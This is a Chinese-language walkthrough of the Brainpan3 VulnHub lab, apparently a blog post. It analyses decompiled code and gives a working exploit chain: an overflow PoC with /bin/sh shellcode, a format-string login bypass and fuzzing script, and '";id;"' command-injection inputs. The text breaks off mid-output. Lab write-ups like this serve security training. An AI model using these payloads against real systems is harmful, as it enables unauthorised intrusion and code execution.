<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v4; // ST14_4</span><br><span class="line">  char dest; // [esp+18h] [ebp-68h]</span><br><span class="line">  unsigned int v6; // [esp+7Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    cb();</span><br><span class="line">    strcpy(&amp;dest, argv[1]);</span><br><span class="line">    v4 = atoi(argv[2]);</span><br><span class="line">    P = (int)REPORT;</span><br><span class="line">    N = (void *)(-sysconf(30) &amp; (unsigned int)REPORT);</span><br><span class="line">    mprotect(N, 0x1F4u, 7);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sanitize(&amp;dest);</span><br><span class="line">      encrypt(&amp;dest);</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">      record_id(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] RECORDED [%s]\n&quot;</span>, &amp;dest);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;report&gt; [0|1]\n&quot;</span>, *argv);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>sanitize</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sanitize(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !isalpha(s[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      s[i] = 63;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>encrypt</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">size_t __cdecl encrypt(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  size_t result; // eax</span><br><span class="line">  unsigned int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v4 = rand() % 9000 + 1000;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(s);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    s[i] ^= v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_data</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_data(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; // eax</span><br><span class="line">  time_t timer; // [esp+2Ch] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+30h] [ebp-58h]</span><br><span class="line">  struct tm *tp; // [esp+34h] [ebp-54h]</span><br><span class="line">  char s; // [esp+3Ah] [ebp-4Eh]</span><br><span class="line">  char dest[4]; // [esp+54h] [ebp-34h]</span><br><span class="line">  int v8; // [esp+58h] [ebp-30h]</span><br><span class="line">  int v9; // [esp+5Ch] [ebp-2Ch]</span><br><span class="line">  int v10; // [esp+60h] [ebp-28h]</span><br><span class="line">  int v11; // [esp+64h] [ebp-24h]</span><br><span class="line">  __int16 v12; // [esp+68h] [ebp-20h]</span><br><span class="line">  unsigned int v13; // [esp+7Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v13 = __readgsdword(0x14u);</span><br><span class="line">  stream = 0;</span><br><span class="line">  time(&amp;timer);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  strftime(&amp;s, 0x1Au, <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, tp);</span><br><span class="line">  memset(dest, 0, 0x28u);</span><br><span class="line">  *(_DWORD *)dest = 1836017711;</span><br><span class="line">  v8 = 1851862885;</span><br><span class="line">  v9 = 1769172577;</span><br><span class="line">  v10 = 1346720303;</span><br><span class="line">  v11 = 1398035023;</span><br><span class="line">  v12 = 47;</span><br><span class="line">  strcat(dest, &amp;s);</span><br><span class="line">  v1 = &amp;dest[strlen(dest)];</span><br><span class="line">  *(_DWORD *)v1 = 1885696558;</span><br><span class="line">  v1[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] WRITING REPORT TO %s\n&quot;</span>, dest);</span><br><span class="line">  stream = fopen(dest, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fputs(a1, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  strncpy(REPORT, a1, 0x64u);</span><br><span class="line">  <span class="built_in">return</span> feedback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_id</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_id(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+19h] [ebp-Fh]</span><br><span class="line">  int (*v3)(); // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = feedback;</span><br><span class="line">  strcpy(&amp;dest, src);</span><br><span class="line">  v3();</span><br><span class="line">  <span class="built_in">return</span> atoi(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>feedback</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int feedback()</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">&quot;[+] DATA SUCCESSFULLY ENCRYPTED&quot;</span>);</span><br><span class="line">  <span class="built_in">return</span> puts(<span class="string">&quot;[+] DATA SUCCESSFULLY RECORDED&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，代码首先检查本地主机名是否为brainpain3，并假设本地主机名是brainpain3，它将report数据复制到&amp;dest，并使用mprotect使REPORT数据可执行。之后，它检查第二个参数。</p>
<ul>
<li>1:将使用sanitize函数过滤&amp;dest中的数据，然后对其进行加密，最后使用record_data函数进行存储，该函数将数据存储到文件中，并将前100个字节复制到REPORT中。</li>
<li>2:数据将直接存储而无需任何过滤或加密，并且将调用附加函数record_id，现在这是一个有趣的函数。</li>
</ul>
<p>当查看record_id函数时，可以看到它为pfeedback分配了一个函数指针，然后将&amp;dest的内容复制到dest中，由于dest最多只能容纳3个字节，因此我们可以溢出它并控制pfeedback指针，该指针将在之后执行strcpy导致代码执行。</p>
<p>在kali中使用gdb调试如下所示</p>
<p><img src="https://r3v3rs3r.files.wordpress.com/2015/09/poc1.png"></p>
<p>因此，总结一下：因为前100个字节存储在可执行位置（REPORT），并且可以控制函数指针（pfeedback），所以可以在REPORT中存储一些shellcode，然后使pfeedback指针指向我的shellcode。可以在IDA中查找REPORT的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0804B0A0                 public REPORT</span><br><span class="line">.bss:0804B0A0 ; char REPORT[500]</span><br><span class="line">.bss:0804B0A0 REPORT          db 1F4h dup(?)          ; DATA XREF: record_data+131↑o</span><br><span class="line">.bss:0804B0A0                                         ; main+7D↑o</span><br><span class="line">.bss:0804B0A0 _bss            ends</span><br><span class="line">.bss:0804B0A0</span><br></pre></td></tr></table></figure>
<p>漏洞利用缓冲区可能类似于：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAA&lt;REPORT_address+7&gt;&lt;shellcode&gt;</span><br></pre></td></tr></table></figure>

<p>请注意，必须在REPORT地址上添加7，以越过3个A和4个字节的函数指针。</p>
<ul>
<li>python版POC代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">__REPORT = 0x0804B0A0</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p(__REPORT + 7)</span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> payload + <span class="string">&#x27; 0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行poc会按预期生成一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment">#./report $(./poc.py)</span></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20150912020038.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">$ id</span><br><span class="line">uid=1000(root) gid=1001(root) groups=1001(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),105(scanner),108(bluetooth),112(netdev),125(powerdev)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="brainpan-console-report功能"><a href="#brainpan-console-report功能" class="headerlink" title="brainpan console - report功能"></a>brainpan console - report功能</h3><p>现在，如果还记得，由于禁用了report功能，目前无法在brainpan控制台中创建report，因此必须启用它，现在这就是“update session name”选项（3）中缓冲区溢出起作用的地方。通过溢出session name缓冲区，可以控制以下值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTH   [Y]    REPORT [N]    MENU   [Y]</span><br></pre></td></tr></table></figure>

<p>通过将REPORT [N]设置为Y，将启用REPORT功能。一个模糊测试脚本可以帮助找到正确的长度，直到覆盖N</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">class NetcatClient:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.linemode:</span><br><span class="line">            data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                self.sock.send(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send( data )</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># fuzzing code</span></span><br><span class="line">    s = NetcatClient(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send format string pattern and grab the login code</span></span><br><span class="line">    r = s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>)</span><br><span class="line">    <span class="comment"># parse the login code from the reponse</span></span><br><span class="line">    l = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, r)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;login code -&gt; &#x27;</span>, l</span><br><span class="line">    <span class="comment"># send login code and log in</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;%s&#x27;</span>%(l[0]))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># send change sessionname commands</span></span><br><span class="line">    <span class="comment"># with length of 0 ... 255</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">        s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        resp = s.sendrecv(i * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">        l = re.findall(r<span class="string">&quot;REPORT \[(.*?)\]&quot;</span>, resp)</span><br><span class="line">        <span class="built_in">print</span> i,<span class="string">&#x27;-&gt;&#x27;</span>,l</span><br><span class="line">        <span class="comment"># if value changed to Y break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Y&#x27;</span> <span class="keyword">in</span> l[0]:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;payload -&gt; %d * Y&#x27;</span> % (i)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"> </span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>运行模糊测试器会导致：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python test.py </span></span><br><span class="line">login code -&gt;  [<span class="string">&#x27;2433&#x27;</span>]</span><br><span class="line">0 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">1 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">2 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">3 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">4 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">5 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">6 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">7 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">8 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">9 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">10 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">11 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">12 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">13 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">14 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">15 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">16 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">17 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">18 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">19 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">20 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">21 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">22 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">23 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">24 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">25 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">26 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">27 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">28 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">29 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">30 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">31 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">32 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">...</span><br><span class="line">244 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">245 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">246 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">247 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">248 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">249 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">250 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">251 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">252 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">253 -&gt; [<span class="string">&#x27;Y&#x27;</span>]</span><br><span class="line">payload -&gt; 253 * Y</span><br></pre></td></tr></table></figure>

<p>因此，通过将session名称设置为253个Y字符，将REPORT功能状态从N更改为Y，从而有效地启用了report功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>在测试该选项时，现在可以看到其确实启用了……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">fuckfuckfuckfuckfuck</span><br><span class="line"></span><br><span class="line">REPORT [fuckfuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200205215605.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [II]</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>因此，现在可以在Brainpan控制台中创建报告，并在报告可执行文件中触发易受攻击的代码，不是吗？似乎Brainpan控制台使用1选项执行了报告可执行文件，并且为了触发record_id中的易受攻击的代码，需要使用0选项来执行它。在这里有些卡住，要在报告缓冲区中打更多的主意。在报表数据中插入双引号时，会出现一个有趣的错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aaa<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aaa&quot;</span>fuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: Syntax error: Unterminated quoted string</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>似乎双引号引起了执行报告命令行时的错误，更准确地说，是未引用的字符串的一部分，但更有趣的是，似乎可以使用报告数据进行命令注入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;id;&quot;</span></span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;id;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;ls;&quot;</span>          </span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;ls;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span 